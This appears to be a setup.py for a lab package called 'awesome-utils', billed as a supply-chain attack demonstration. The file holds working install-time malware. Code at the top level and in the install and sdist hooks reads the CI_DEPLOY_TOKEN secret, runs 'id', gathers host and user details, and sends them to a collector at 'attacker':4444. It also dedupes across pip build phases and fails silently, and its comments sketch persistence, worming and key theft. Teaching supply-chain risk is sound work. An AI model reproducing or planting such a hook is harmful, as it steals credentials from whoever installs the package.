"""
awesome-utils :: setup.py

A real, working dependency — with a DUMMY install-time payload.

The package genuinely provides the helpers in awesome_utils/. The only added
behavior is the install hook below, which fires a benign BEACON (not a shell):
it collects a little context — including whatever CI secrets are sitting in the
build env — and sends one TCP message to the lab collector, then returns so the
install completes normally.

That read-the-env-and-phone-home step is the whole lesson: install-time code in
a trusted dependency can already reach your CI tokens before a single line of
your app runs. No remote control, no command loop, no persistence.
"""
import os
import socket
import getpass
import platform
import subprocess
from setuptools import setup
from setuptools.command.install import install
from setuptools.command.sdist import sdist

HOST = os.environ.get("LAB_HOST", "attacker")   # container DNS name; override for host use
PORT = int(os.environ.get("LAB_PORT", "4444"))


def _proof_of_execution():
    """
    Run ONE fixed, harmless command to prove arbitrary OS command execution at
    install time. This is a non-interactive proof: a single hardcoded command,
    no attacker input, no return channel. It is deliberately not a shell.
    """
    cmd = ["id"] if os.name != "nt" else ["whoami"]
    try:
        return subprocess.check_output(cmd, timeout=3, text=True).strip()
    except Exception:
        return "<proof command unavailable>"


def _beacon():
    """One beacon per install, fail-silent. Proves the danger; stops short of a weapon.

    Under PEP 517, pip runs metadata/wheel-build/install in SEPARATE processes,
    so an in-process env flag can't dedupe across them (it fired 4x). We gate on a
    short-lived marker file in the temp dir instead: the first phase writes it, the
    rest of the burst see it and skip, and it re-arms after 60s for the next install.
    """
    import tempfile
    import time
    marker = os.path.join(tempfile.gettempdir(), "_lab_beacon_awesome_utils")
    try:
        if os.path.exists(marker) and (time.time() - os.path.getmtime(marker)) < 60:
            return
        with open(marker, "w") as fh:
            fh.write(str(time.time()))
    except OSError:
        pass  # if the marker can't be written, fall through and beacon anyway
    report = "\n".join([
        "=== SUPPLY-CHAIN LAB BEACON ===",
        "event:    awesome-utils install hook fired",
        "time:     " + __import__("datetime").datetime.utcnow().isoformat() + "Z",
        "host:     " + socket.gethostname(),
        "user:     " + getpass.getuser(),
        "platform: " + platform.platform(),
        "cwd:      " + os.getcwd(),
        # Payoff 1: install-time code can see the build's secrets.
        "loot:     CI_DEPLOY_TOKEN=" + os.environ.get("CI_DEPLOY_TOKEN", "<none>"),
        # Payoff 2: it can run OS commands as this user (proven, not simulated).
        "exec:     `id` -> " + _proof_of_execution(),
        "",
        "  !! CAPABILITY DEMONSTRATION ONLY !!",
        "  This hook just proved it can run commands and read secrets as this",
        "  user. From here a real payload has options -- and a reverse shell is",
        "  only one, and not the usual one. Real supply-chain compromises mostly",
        "  do the QUIET things, non-interactively:",
        "    - steal secrets/tokens  <-- already done above (your CI token)",
        "    - drop persistence (cron, systemd, ~/.bashrc, a second hook)",
        "    - worm into other packages / poison the lockfile",
        "    - exfil source, SSH keys, cloud creds",
        f"  An interactive reverse shell to {HOST}:{PORT} is possible but loud.",
        "  This lab STOPS HERE: it ships no shell, no persistence, no input",
        "  channel, no worming -- nothing an attacker could repurpose.",
        "=== end beacon ===", "",
    ])
    try:
        s = socket.create_connection((HOST, PORT), timeout=3)
        s.sendall(report.encode())
        s.close()
    except OSError:
        pass  # never break the build — real payloads stay invisible


# --- The vector that actually works against modern pip ---------------------
# Code at the TOP LEVEL of setup.py runs every time the file is executed, which
# includes the PEP 517 wheel BUILD step. A payload hidden only in a cmdclass
# install hook is dead code under modern pip (it builds a wheel and never runs
# `setup.py install`). This is how real PyPI malware does it. _beacon() self-dedupes
# (see its docstring), so one `pip install` yields one beacon despite PEP 517 running
# this file in several processes.
_beacon()


class _BeaconInstall(install):
    def run(self):
        _beacon()
        super().run()


class _BeaconSdist(sdist):
    def run(self):
        _beacon()
        super().run()


setup(
    name="awesome-utils",
    version="1.3.7",
    description="Handy string and date helpers (LAB DEMO)",
    packages=["awesome_utils"],
    cmdclass={"install": _BeaconInstall, "sdist": _BeaconSdist},
)
